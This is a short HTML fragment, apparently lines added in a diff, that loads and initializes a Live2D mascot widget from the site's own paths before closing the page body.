+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script></body>
+</html>
